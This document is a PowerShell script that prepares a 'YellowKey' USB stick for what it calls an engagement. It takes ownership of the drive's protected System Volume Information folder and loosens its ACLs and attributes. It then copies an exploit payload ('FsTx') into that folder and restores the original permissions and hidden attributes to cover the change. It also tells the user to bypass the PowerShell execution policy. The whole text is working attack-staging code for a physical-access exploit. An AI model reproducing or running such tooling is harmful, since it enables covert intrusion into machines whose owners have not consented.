<# 
.SYNOPSIS
    Pre‑pares a YellowKey USB stick for a new engagement.

.DESCRIPTION
    The YellowKey payload is stored on the USB under   YK\FsTx
    The exploit expects the same folder tree under
        System Volume Information\FsTx

    This script:
        1. Takes ownership of the protected folder.
        2. Grants the Administrators group full control.
        3. Clears the hidden+system attributes.
        4. Copies the FsTx payload into the protected location.
        5. Restores the original hidden+system attributes.
        6. Restores the default ACLs (SYSTEM full control only).

    Run the script from an **Administrator** PowerShell window.
    [!] Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass [!]
#>

# ----------------------------------------------------------------
# Helper – simple status output (no colours, no special symbols)
function Write-Info {
    param([string]$Message)
    Write-Host $Message
}

# ----------------------------------------------------------------
# Step 0 – determine the USB drive letter
function Get-UsbDriveLetter {
    $removable = Get-Volume | Where-Object {
        $_.DriveType -eq 'Removable' -and $_.FileSystem -ne $null
    }

    if ($removable.Count -eq 0) {
        Write-Info "No removable USB drives detected. Insert the USB and press ENTER."
        Read-Host
        return Get-UsbDriveLetter
    }

    if ($removable.Count -eq 1) {
        return $removable.DriveLetter
    }

    Write-Host "Detected removable drives:"
    foreach ($v in $removable) {
        Write-Host "  [$($v.DriveLetter)] $($v.FileSystemLabel)  ($([math]::Round($v.Size/1GB,1)) GB)"
    }

    do {
        $letter = Read-Host "Enter the drive letter of the YellowKey USB (e.g. E)"
        $letter = $letter.TrimEnd(':').ToUpper()
    } while (-not ($removable.DriveLetter -contains $letter))

    return $letter
}

# ----------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------
$usbLetter = Get-UsbDriveLetter
$usbRoot   = "$usbLetter`:"

# Verify the expected folders exist on the USB
if (-not (Test-Path "$usbRoot\YK\FsTx")) {
    Write-Info "Cannot find '$usbRoot\YK\FsTx'. Verify this is the correct USB."
    exit 1
}
if (-not (Test-Path "$usbRoot\System Volume Information")) {
    Write-Info "Folder '$usbRoot\System Volume Information' not found. Something is wrong with the USB."
    exit 1
}

# Paths used later
$svInfo      = "$usbRoot\System Volume Information"
$srcFsTx     = "$usbRoot\YK\FsTx"
$dstFsTxRoot = "$svInfo\FsTx"

# ----------------------------------------------------------------
# 1. Take ownership of the protected folder (recursive)
Write-Info "Taking ownership of '$svInfo' (recursive)..."
$takeOwn = "takeown.exe /F `"$svInfo`" /R /D Y"
Invoke-Expression $takeOwn

# 2. Grant Administrators full control (recursive)
Write-Info "Granting Administrators full control..."
$grantAdmins = "icacls.exe `"$svInfo`" /grant *S-1-5-32-544:F /T"
Invoke-Expression $grantAdmins

# 3. Remove hidden and system attributes so we can write
Write-Info "Removing hidden and system attributes..."
attrib.exe -H -S "`"$svInfo`"" >$null

# 4. Copy the payload (overwrite any existing FsTx)
Write-Info "Copying payload from '$srcFsTx' to '$dstFsTxRoot' ..."
Copy-Item -Path $srcFsTx -Destination $svInfo -Recurse -Force -ErrorAction Stop

# 5. Restore the hidden and system attributes
Write-Info "Restoring hidden and system attributes..."
attrib.exe +H +S "`"$svInfo`"" >$null

# 6a. Remove the Administrators ACE we added
Write-Info "Removing Administrators ACE..."
icacls.exe "`"$svInfo`"" /remove "Administrators" /T >$null

# 6b. Grant SYSTEM full control (the default for this folder)
Write-Info "Granting SYSTEM full control..."
icacls.exe "`"$svInfo`"" /grant *S-1-5-18:F /T >$null

Write-Info ""
Write-Info "YellowKey USB is now primed and ready for use."
Write-Info "You can safely eject the USB now."
